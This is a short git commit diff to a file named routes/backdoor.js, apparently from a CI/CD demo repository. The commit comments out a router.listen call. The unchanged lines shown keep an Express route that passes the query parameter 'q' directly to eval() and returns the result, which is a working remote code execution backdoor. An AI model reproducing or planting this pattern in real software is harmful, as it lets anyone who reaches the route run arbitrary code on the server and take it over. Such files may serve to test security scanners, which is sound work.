0701c8dd43daab8a27d646a06405eb72331f9165
cicdomgeving <61230583+cicdomgeving@users.noreply.github.com>
2020-03-30 12:47:29 +0200

    Update backdoor.js
    remove .listen function

--- routes/backdoor.js
+++ routes/backdoor.js
@@ -7,8 +7,8 @@ router.get('/', function (req, res) {
     res.send('Hello ' + eval(req.query.q));
     console.log(req.query.q);
 });
-router.listen(8080, function () {
+/*router.listen(8080, function () {
     console.log('Example app listening on port 8080!');
-});
+});*/
 
 module.exports = router;
